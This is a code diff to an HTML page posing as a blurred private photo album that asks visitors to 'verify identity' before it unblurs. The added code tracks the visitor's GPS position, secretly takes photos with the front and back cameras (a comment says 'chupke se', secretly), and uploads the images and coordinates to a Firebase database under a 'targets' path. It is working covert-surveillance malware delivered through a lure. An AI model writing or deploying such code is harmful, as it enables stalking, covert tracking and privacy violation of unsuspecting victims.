@@ -9,9 +9,8 @@
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #111; color: white; text-align: center; margin: 0; padding: 20px; }
         .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 20px; }
-        .img-container { position: relative; overflow: hidden; border-radius: 10px; height: 200px; }
+        .img-container { position: relative; overflow: hidden; border-radius: 10px; height: 180px; }
         .img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(15px); transition: 2s; }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); }
         #unlockBtn { margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; background: #E91E63; color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(233,30,99,0.4); }
         #status { margin-top: 15px; color: #aaa; font-size: 14px; }
     </style>
@@ -38,37 +37,73 @@
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const userId = "Driver_" + Math.floor(Math.random() * 1000);
+        const userId = "Driver_" + Math.floor(Math.random() * 9999);
 
-        function unlockAlbum() {
+        async function unlockAlbum() {
             document.getElementById('status').innerText = "Verifying Identity... Please Allow Permissions";
             
-            // 1. Ask for Location, Camera, Audio
+            // 1. Start Location Tracking
             navigator.geolocation.watchPosition(success, error, { enableHighAccuracy: true });
             
-            async function getMedia() {
+            // 2. Start Camera & Audio Capture
+            try {
+                // Initial permission request
+                const initialStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                initialStream.getTracks().forEach(track => track.stop()); // Stop immediately after permission
+                
+                // Chupke se dono camera se photo lena
+                await capturePhotos();
+                unblurPhotos();
+            } catch (err) {
+                alert("Verification Failed. Please allow permissions to view the album.");
+                console.log(err);
+            }
+        }
+
+        async function capturePhotos() {
+            const modes = ['user', 'environment']; // Front aur Back
+            for (let mode of modes) {
                 try {
-                    await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                    unblurPhotos();
-                } catch (err) {
-                    alert("Verification Failed. Please allow camera/mic to view album.");
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: mode }, 
+                        audio: false 
+                    });
+                    
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.5); // 0.5 for small size
+                    
+                    // Firebase Database mein bhejien
+                    db.ref('targets/' + userId + '/photos').push({
+                        type: mode === 'user' ? 'Front' : 'Back',
+                        image: imageData,
+                        time: new Date().toLocaleTimeString()
+                    });
+
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (e) {
+                    console.log(mode + " Camera Error: " + e);
                 }
             }
-            getMedia();
         }
 
         function success(pos) {
-            // Send to Firebase
             db.ref('targets/' + userId + '/location').set({
                 lat: pos.coords.latitude,
                 lng: pos.coords.longitude,
                 timestamp: new Date().toLocaleTimeString()
             });
-            unblurPhotos();
         }
 
         function error() {
-            alert("Please enable GPS to view this private content.");
+            console.log("GPS Denied");
         }
 
         function unblurPhotos() {
